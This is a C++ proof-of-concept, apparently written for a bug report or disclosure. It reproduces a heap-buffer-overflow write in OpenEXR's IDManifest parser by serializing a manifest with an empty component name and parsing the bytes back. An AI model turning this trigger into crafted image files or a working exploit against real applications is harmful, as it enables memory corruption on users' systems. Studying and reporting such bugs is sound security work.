// SPDX-License-Identifier: BSD-3-Clause
//
// Proof-of-concept for a heap-buffer-overflow write reachable through the
// public Imf::IDManifest API.
//
// A channel group's declared component list ["id", ""] is written to a
// manifest, serialized through the library's own serialize(), and the
// resulting bytes are fed straight back into the public, non-explicit
// IDManifest(const char*, const char*) constructor -- the same constructor
// used when an application reads an idmanifest attribute's raw payload.
//
// Build as C++ (the Imf API is C++); e.g.:
//   g++ -std=c++17 -fsanitize=address -g -O1 probe.c -o probe \
//       -I<openexr>/src/lib/OpenEXR -I<build>/src/lib/OpenEXR \
//       -I<imath>/include -L<build>/src/lib/OpenEXR -lOpenEXR... -lIex...

#include <ImfIDManifest.h>

#include <cstdio>
#include <set>
#include <string>
#include <vector>

using namespace OPENEXR_IMF_NAMESPACE;
using std::set;
using std::string;
using std::vector;

int
main (void)
{
    IDManifest mfst;

    IDManifest::ChannelGroupManifest& grp = mfst.add ("R");

    // declare two components, the second of which is an empty name
    vector<string> comps (2);
    comps[0] = "id";
    comps[1] = "";
    grp.setComponents (comps);
    grp.setHashScheme (IDManifest::NOTHASHED);
    grp.setLifetime (IDManifest::LIFETIME_STABLE);

    // insert one entry with text matching the declared component count
    vector<string> text (2);
    text[0] = "value1";
    text[1] = "";
    grp.insert (1, text);

    vector<char> data;
    mfst.serialize (data);

    std::fprintf (stderr, "serialized manifest: %zu bytes\n", data.size ());

    // feed the serialized bytes back through the public byte-stream
    // constructor, exactly as an application reading an idmanifest
    // attribute's decompressed payload would.
    IDManifest parsed (data.data (), data.data () + data.size ());

    std::fprintf (stderr, "parsed manifest with %zu channel group(s)\n", parsed.size ());

    return 0;
}
